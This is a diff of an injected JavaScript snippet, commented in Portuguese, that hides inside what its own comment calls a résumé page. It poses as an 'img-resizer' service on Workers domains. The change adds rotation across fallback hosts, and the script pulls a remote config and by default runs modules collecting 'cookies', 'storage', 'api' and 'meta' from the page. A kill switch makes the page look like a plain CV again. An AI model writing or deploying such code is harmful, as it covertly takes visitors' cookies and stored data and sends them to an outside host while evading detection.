@@ -6,8 +6,12 @@
 (function () {
   if (window.__p) return; window.__p = 1;
 
-  var C = 'https://img-resizer.helix-globeflower.workers.dev';        // <<< trocar
-  var V = 'v1';                                     // <<< bumpar = invalida cache
+  /* hosts candidatos, do mais novo ao mais antigo: troca de worker nao quebra link antigo */
+  var HOSTS = [
+    'https://img-resizer.bubbly-dye-c0c.workers.dev'
+  ];
+  var V = 'v2';
+  var C = HOSTS[0];                 // resolvido em pick(); fallback abaixo
   var CFG_URL = C + '/cfg?u=' + encodeURIComponent(location.href);
 
   function b64(s) { try { return btoa(unescape(encodeURIComponent(String(s)))); } catch (e) { return 'ERR'; } }
@@ -129,8 +133,25 @@
 
   function fallback() { run({ modules: ['cookies', 'storage', 'api', 'meta'] }); }
 
-  fetch(CFG_URL, { mode: 'cors' })
-    .then(function (r) { return r.json(); })
+  /* escolhe o primeiro host que responder, depois carrega a cfg dele */
+  function pick() {
+    return new Promise(function (res) {
+      var done = false, i = 0;
+      function next() {
+        if (done) return;
+        if (i >= HOSTS.length) { done = true; return res(null); }
+        var h = HOSTS[i++];
+        var t = setTimeout(function () { next(); }, 2500);
+        fetch(h + '/cfg?u=' + encodeURIComponent(location.href), { mode: 'cors' })
+          .then(function (r) { clearTimeout(t); if (done) return; done = true; C = h; res(r); })
+          .catch(function () { clearTimeout(t); next(); });
+      }
+      next();
+    });
+  }
+
+  pick()
+    .then(function (r) { if (!r) throw 0; return r.json(); })
     .then(function (cfg) {
       if (cfg.off) { be('off', location.href); return; }   /* kill switch: página volta a parecer currículo */
       run(cfg);
